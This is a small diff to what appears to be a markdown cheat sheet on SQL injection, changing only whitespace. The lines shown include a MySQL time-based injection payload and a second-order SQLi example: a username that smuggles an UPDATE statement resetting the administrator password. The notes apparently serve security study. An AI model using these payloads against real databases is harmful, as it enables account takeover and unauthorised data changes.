@@ -46,6 +46,6 @@ possible due to synchronous processing of SQL queries
 **MySQL:** `'; IF (1=1) SELECT SLEEP(10)--`  
 
 ### Second-order SQLi
-Input is safely handled initially and stored in database, but when data is later accessed and processed...   
-*Username:* `badguy'; UPDATE users SET password='letmein' WHERE user='administrator'--`
+Input is safely handled initially and stored in database, but when data is later accessed and processed...  
+*Username:* `badguy'; UPDATE users SET password='letmein' WHERE user='administrator'--`  
 Backend Query: `SELECT * from user_options WHERE username='{}'`
